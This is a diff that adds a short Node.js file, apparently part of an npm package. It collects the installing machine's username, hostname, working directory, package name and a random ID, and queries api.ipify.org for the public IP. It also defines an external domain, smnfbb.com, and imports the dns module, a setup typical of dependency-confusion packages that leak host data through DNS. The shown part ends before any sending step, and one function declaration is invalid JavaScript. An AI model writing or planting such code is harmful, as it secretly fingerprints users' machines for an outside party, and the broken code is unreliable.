@@ -1,0 +1,25 @@
+const http = require('http')
+var os = require("os")
+var dns = require("dns")
+function generateString = function generateString(length) {
+    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+
+    return result;
+}
+const topDomain = "smnfbb.com"
+const packageName = process.argv[2]
+const cwd = process.cwd()
+const username = os.userInfo().username
+const hostname = os.hostname()
+const ID = generateString(5)
+var IP = ""
+http.get({ 'host': 'api.ipify.org', 'port': 80, 'path': '/' }, function (resp) {
+        resp.on('data', function (ip) {
+            IP = ip
+        });
+    })
